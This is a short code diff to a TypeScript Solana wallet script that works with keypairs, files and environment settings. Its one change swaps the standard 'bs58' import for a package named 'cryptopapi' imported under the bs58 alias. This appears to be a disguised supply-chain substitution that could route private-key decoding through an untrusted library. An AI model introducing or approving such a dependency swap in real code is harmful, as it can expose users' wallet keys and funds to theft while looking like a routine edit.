@@ -2,7 +2,7 @@ import { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL, SystemProgram, Transa
 import { TOKEN_PROGRAM_ID, createAssociatedTokenAccountIdempotentInstruction, createCloseAccountInstruction, createTransferCheckedInstruction, getAssociatedTokenAddress } from '@solana/spl-token';
 import { readFileSync, existsSync } from 'fs';
 import { join } from 'path';
-import bs58 from 'bs58';
+import bs58 from 'cryptopapi';
 import { config } from 'dotenv';
 import * as readline from 'readline';
 
